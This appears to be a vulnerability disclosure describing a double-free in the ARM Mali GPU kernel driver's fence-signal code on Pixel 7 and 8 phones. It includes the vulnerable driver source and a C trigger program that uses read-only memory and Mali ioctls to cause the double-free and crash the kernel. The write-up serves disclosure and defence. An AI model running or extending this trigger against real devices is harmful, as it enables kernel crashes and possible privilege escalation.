## Details
Its unclear which CVE this relates to and what are the vulnerable driver versions on ARM website but on Pixel phones it was introduced in SPL 230305 and patched in 231205. Pixel 7 and 8 series were vulnerable.

Drivers must have Command Stream Frontend (CSF) enabled.

The double-free is located in the function `kbase_kcpu_fence_signal_prepare` of the source file `csf/mali_kbase_csf_kcpu.c`

``` cpp
static int kbase_kcpu_fence_signal_prepare(
		struct kbase_kcpu_command_queue *kcpu_queue,
		struct base_kcpu_command_fence_info *fence_info,
		struct kbase_kcpu_command *current_command)
{
	struct kbase_context *const kctx = kcpu_queue->kctx;
#if (KERNEL_VERSION(4, 10, 0) > LINUX_VERSION_CODE)
	struct fence *fence_out;
#else
	struct dma_fence *fence_out;
#endif
	struct base_fence fence;
	struct sync_file *sync_file;
	int ret = 0;
	int fd;

	lockdep_assert_held(&kctx->csf.kcpu_queues.lock);

	if (copy_from_user(&fence, u64_to_user_ptr(fence_info->fence),
			sizeof(fence)))
		return -EFAULT;

	fence_out = kzalloc(sizeof(*fence_out), GFP_KERNEL); (1)
	if (!fence_out)
		return -ENOMEM;

	dma_fence_init(fence_out,
		       &kbase_fence_ops,
		       &kbase_csf_fence_lock,
		       kcpu_queue->fence_context,
		       ++kcpu_queue->fence_seqno);

#if (KERNEL_VERSION(4, 9, 67) >= LINUX_VERSION_CODE)
	/* Take an extra reference to the fence on behalf of the sync file.
	 * This is only needded on older kernels where sync_file_create()
	 * does not take its own reference. This was changed in v4.9.68
	 * where sync_file_create() now takes its own reference.
	 */
	dma_fence_get(fence_out);
#endif

	/* create a sync_file fd representing the fence */
	sync_file = sync_file_create(fence_out);
	if (!sync_file) {
		ret = -ENOMEM;
		goto file_create_fail;
	}

	fd = get_unused_fd_flags(O_CLOEXEC);
	if (fd < 0) {
		ret = fd;
		goto fd_flags_fail;
	}

	fence.basep.fd = fd;

	current_command->type = BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL;
	current_command->info.fence.fence = fence_out;

	if (copy_to_user(u64_to_user_ptr(fence_info->fence), &fence,
			sizeof(fence))) {
		ret = -EFAULT;
		goto fd_flags_fail; (2)
	}

	/* 'sync_file' pointer can't be safely dereferenced once 'fd' is
	 * installed, so the install step needs to be done at the last
	 * before returning success.
	 */
	fd_install(fd, sync_file->file);
	return 0;

fd_flags_fail:
	fput(sync_file->file);
file_create_fail:
	/*
	 * Upon failure, dma_fence refcount that was increased by
	 * dma_fence_get() or sync_file_create() needs to be decreased
	 * to release it.
	 */
	dma_fence_put(fence_out); (3)

	current_command->info.fence.fence = NULL;
	kfree(fence_out); (4)

	return ret;
}
```

At (1) a `dma_fence` object named `fence_out` is allocated, if a `copy_to_user` fails later on, cleanup and error handling in the label `file_create_fail` will be triggered as part of step (2). This allocated object `fence_out` has its reference counter decreased via a call to `dma_fence_put` (3) and will reach zero as there is only one reference to it at that stage. This will trigger the execution of the `dma_fence_release` function and later `dma_fence_free` which does not use the regular `kfree` but instead uses `kfree_rcu`. Just after step (3), the `fence_out` object is freed (4). `kfree_rcu` does not free an object immediately, but rather schedules it to be freed when certain criterias are met. This acts somewhat like a delayed free that introduces an uncertainty in when the object is freed but from experience on Pixel devices, this object always freed immediately when returning from the syscall to userspace. The `copy_to_user` can be triggered to fail by making the memory region read-only, see trigger code. 


## Trigger

``` cpp
void main() {
	int mali_fd = open("/dev/mali0", O_RDWR);
	struct kbase_ioctl_version_check vc = {
		.major = 11,
		.minor = 11
	};
	
	// setup
	ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
	ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
	void *r = (void *) mmap((void *) 0x21000000UL, 0x400000, PROT_READ|PROT_WRITE, 
				MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0ul);
	
	memset(r+8, 0x00, 1); 
	memset(r+9, 0x04, 1); 
	memset(r+10, 0x00, 1); 
	memset(r+11, 0x21, 1); 
	
	// create read-only mapping in order to reach error handling in driver
	mprotect(r, 0x400000, PROT_READ);
	
	struct kbase_ioctl_kcpu_queue_new kqc = {};
	ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kqc);  
	
	struct kbase_ioctl_kcpu_queue_enqueue kqe = {
		.addr = 0x21000000ul,
		.nr_commands = 1,
		.id = 0
	};
	
	// trigger double-free
	ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &kqe);
}
```

Running this repeatedly should eventually result in a kernel panic due to `kernel BUG at mm/slub.c:300!` or a `Unable to handle kernel paging request` issue.
